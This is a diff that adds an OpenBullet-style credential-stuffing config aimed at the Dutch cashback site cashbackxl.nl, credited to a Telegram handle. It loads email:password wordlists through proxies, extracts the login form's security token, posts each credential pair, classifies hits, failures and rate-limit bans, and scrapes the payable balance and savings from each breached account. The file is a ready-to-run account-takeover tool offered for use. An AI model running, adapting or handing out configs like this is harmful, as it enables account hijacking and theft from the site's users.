@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "cashbackxl.nl",
+  "SuggestedBots": 40,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-16T14:18:52.6428796+04:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 719190021
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.cashbackxl.nl/auth/login" 
+  
+  HEADER "Host: www.cashbackxl.nl" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.cashbackxl.nl/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: iframe" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Te: trailers" 
+
+#Token PARSE "<SOURCE>" LR "name=\"securityToken\" value=\"" "\"" -> VAR "Token" 
+
+#login REQUEST POST "https://www.cashbackxl.nl/auth/login" EncodeContent=TRUE 
+  CONTENT "_qf__loginForm=&securityToken=<Token>&isSent=1&emailAddress=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.cashbackxl.nl" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://www.cashbackxl.nl" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.cashbackxl.nl/auth/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: iframe" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Ongeldig e-mailadres" 
+  KEYCHAIN Success OR 
+    KEY "<script type=\"text/javascript\">top.location.href='/mijn-account';</script>" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "429" 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#Get REQUEST GET "https://www.cashbackxl.nl/mijn-account" 
+  
+  HEADER "Host: www.cashbackxl.nl" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://www.cashbackxl.nl/mijn-account" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+
+#value PARSE "<SOURCE>" REGEX "Dit bedrag kun je laten uitbetalen.\\n                    <\\/div>\\n                <\\/div>\\n            <\\/div>\\n            <div class=\"account-overview-item__value\">\\n(.*)\\n            <\\/div>" "[1]" -> VAR "value" 
+
+#Balance FUNCTION Replace "&euro;&nbsp;" "€" "<value>" -> CAP "Balance" 
+
+#value2 PARSE "<SOURCE>" REGEX "Dit is de optelsom van jouw uitbetalingen, Saldo en In behandeling.\\n                    <\\/div>\\n                <\\/div>\\n            <\\/div>\\n            <div class=\"account-overview-item__value\">\\n(.*)\\n            <\\/div>" "[1]" -> VAR "value2" 
+
+#Saved FUNCTION Replace "&euro;&nbsp;" "€" "<value2>" -> CAP "Saved" 
+
+#Config_By FUNCTION Constant "@Hogo_Victor" -> CAP "Config By" 
+
